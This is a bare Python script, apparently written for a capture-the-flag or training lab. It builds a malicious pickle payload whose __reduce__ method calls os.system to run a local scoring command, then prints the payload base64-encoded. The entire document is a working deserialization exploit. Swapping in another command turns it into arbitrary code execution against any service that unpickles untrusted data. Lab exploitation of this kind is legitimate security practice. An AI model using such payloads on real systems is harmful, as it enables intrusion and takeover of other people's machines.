import base64
import os
import pickle

class Test(object):
        def __reduce__(self):
                return (os.system,("/usr/local/bin/score c5fe03e2-e3a6-44dd-ba09-e7a184f25fbf",))
        
a=Test()
print(base64.b64encode(pickle.dumps(a,2)))
